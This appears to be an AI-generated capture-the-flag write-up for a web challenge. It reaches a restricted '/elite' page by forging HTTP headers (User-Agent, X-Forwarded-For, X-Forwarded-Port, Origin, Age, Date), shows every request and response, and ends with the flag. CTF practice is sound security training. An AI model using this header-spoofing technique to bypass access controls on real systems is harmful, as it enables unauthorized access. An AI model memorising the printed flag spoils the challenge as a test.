Certainly! Here's a more detailed markdown writeup for the challenge:

---

# Challenge Writeup: Elite Agent Access

## Challenge Overview

The challenge involves accessing a restricted page at `/elite` on the server `chall.ycfteam.in:6375`. The page hints that only "Elite Agents" can access it, suggesting the need for specific HTTP request modifications to gain access. The challenge gradually reveals more requirements, such as using a specific `User-Agent`, accessing through a proxy chain, sending requests through a specific port, and even manipulating time-related headers.

## Step-by-Step Solution

### 1. Initial Access Attempt

The first request was made to the `/elite` endpoint using a standard `User-Agent` string:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:15:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 38
Connection: close

Only Elite Agents can access this page
```

The server responded that only "Elite Agents" could access the page. This indicated that the `User-Agent` header might need to be changed.

### 2. Changing the `User-Agent`

To proceed, the `User-Agent` string was modified to `Elite`:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Elite
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:14:38 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 122
Connection: close

Elite members can access this endpoint only via our dedicated proxy chain:
50.23.41.34
3.54.85.90
110.34.87.34
10.43.21.25
```

The response revealed that Elite members must access the endpoint via a dedicated proxy chain. The IP addresses of the proxy chain were provided.

### 3. Adding the `X-Forwarded-For` Header

Next, the `X-Forwarded-For` header was added to simulate accessing through the provided proxy chain:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Elite
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 50.23.41.34,3.54.85.90,110.34.87.34,10.43.21.25
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:14:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 72
Connection: close

Nope! We only accept requests from our Elite port number - 31173. Leave!
```

The server now required that the request originate from a specific port number, `31173`.

### 4. Adding the `X-Forwarded-Port` Header

The `X-Forwarded-Port` header was added to include the required port number:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Elite
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 50.23.41.34,3.54.85.90,110.34.87.34,10.43.21.25
X-Forwarded-Port: 31173
Orgin: http://www.chall.ycfteam.in:6375
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:13:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 85
Connection: close

Wait! Where did this request even originate from? How dare you try to enter our club.
```

The server responded suspiciously, prompting the need to include an `Origin` header.

### 5. Adding the `Origin` Header

The `Origin` header was added with the base URL:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Elite
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 50.23.41.34,3.54.85.90,110.34.87.34,10.43.21.25
X-Forwarded-Port: 31173
Origin: http://chall.ycfteam.in:6375/
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:12:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 171
Connection: close

Something's fishy... Your request to join the elite club should have been cached in each proxy server for 5 seconds. I don't like this. I can't allow you to join. Be gone!
```

The server now expected the request to have been cached for 5 seconds, indicating the need for an `Age` header.

### 6. Adding the `Age` Header

To address the cache requirement, an `Age` header was added to simulate a 20-second cache:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Elite
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 50.23.41.34,3.54.85.90,110.34.87.34,10.43.21.25
X-Forwarded-Port: 31173
Origin: http://chall.ycfteam.in:6375/
Age: 20
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:11:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 141
Connection: close

Oops! It seems you are too late my friend... We already closed the club registration on 27th May 2024 at 11 AM IST. Maybe next time...See ya!
```

The server rejected the request due to a time constraint, requiring the `Date` header to be adjusted.

### 7. Adding a Custom `Date` Header

To bypass the time restriction, the `

Date` header was manually set to a time before the cutoff:

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
Upgrade-Insecure-Requests: 1
User-Agent: Elite
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 50.23.41.34,3.54.85.90,110.34.87.34,10.43.21.25
X-Forwarded-Port: 31173
Origin: http://chall.ycfteam.in:6375/
Age: 20
Date: Wed, 21 Oct 2015 07:28:00 GMT
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Response:**

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sun, 25 Aug 2024 17:10:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 220
Connection: close

Alright then! You've proven that you are indeed Elite!! Congratulations on joining the club! It's great to have you on board with us. Here's your exclusive welcome gift: CyGenixCTF{W3lc0me_t0_Th3_ELIt3_5qU4d_5bf90dac2b7}
```

### Flag

The final flag obtained was:

```
CyGenixCTF{W3lc0me_t0_Th3_ELIt3_5qU4d_5bf90dac2b7}
```

## Conclusion

This challenge required carefully manipulating HTTP request headers to meet the specific conditions enforced by the server. By analyzing the server responses and making incremental adjustments, the necessary access was gained, and the flag was retrieved successfully.

--- 

This comprehensive writeup details each step and includes all necessary HTTP requests and responses, ensuring clarity for anyone reviewing the challenge.
